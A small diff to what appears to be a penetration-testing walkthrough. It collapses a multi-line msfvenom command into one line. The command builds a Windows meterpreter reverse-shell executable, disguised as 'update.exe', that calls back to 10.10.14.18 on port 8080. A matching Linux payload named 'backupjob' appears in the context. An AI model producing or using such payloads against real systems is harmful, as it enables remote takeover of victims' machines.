@@ -36,11 +36,7 @@ msfvenom -p linux/x64/meterpreter/reverse_tcp \
   -o backupjob
 
 # Windows pivot host
-msfvenom -p windows/x64/meterpreter/reverse_tcp \
-  LHOST=10.10.14.18 \
-  LPORT=8080 \
-  -f exe \
-  -o update.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 LPORT=8080 -f exe -o update.exe
 ```
 
 ### Step 2: Setup Metasploit Handler
